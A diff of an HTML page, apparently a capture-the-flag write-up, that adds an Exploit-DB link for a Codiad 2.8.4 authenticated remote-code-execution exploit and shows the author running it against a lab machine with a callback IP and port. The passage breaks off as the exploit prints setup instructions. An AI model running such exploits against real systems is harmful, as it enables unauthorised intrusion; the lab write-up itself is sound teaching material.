@@ -195,7 +195,7 @@ Also, please take care of the image file ;<span style=color:#f92672>)</span>
 <p>After some research, the port <code>80</code> has just a default apache2 web server running, the insterest web page is on port <code>62337</code>.</p>
 <p>We have a login page for <code>Codiad</code>, a web based IDE! And we also know that the version is <code>2.8.4</code>!</p>
 <h2 id=foothold---user>Foothold - User</h2>
-<p>So, after googling something easy as <code>Codiad 2.8.4 exploit</code>, I found a public exploit to get RCE with an authenticated user! <a href>Here&rsquo;s the link to the exploit</a></p>
+<p>So, after googling something easy as <code>Codiad 2.8.4 exploit</code>, I found a public exploit to get RCE with an authenticated user! <a href=https://www.exploit-db.com/exploits/49705>Here&rsquo;s the link to the exploit</a></p>
 <p>So far so good, let&rsquo;s run the exploit!</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ python3 exp.py http://10.10.233.193:62337/ john <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span> 10.9.4.36 <span style=color:#ae81ff>1337</span> linux
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Please execute the following command on your vps: 
